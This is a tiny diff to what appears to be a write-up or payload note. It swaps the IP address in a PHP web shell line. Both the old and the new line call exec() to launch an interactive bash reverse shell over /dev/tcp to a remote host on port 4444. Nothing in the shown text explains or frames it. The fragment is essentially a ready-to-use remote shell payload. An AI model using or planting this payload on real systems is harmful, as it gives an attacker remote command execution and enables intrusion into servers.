@@ -2,7 +2,7 @@
 
 ```json
 <?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.1.178/4444 0>&1'");
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.23.142.138/4444 0>&1'");
 ?>
 ```
 
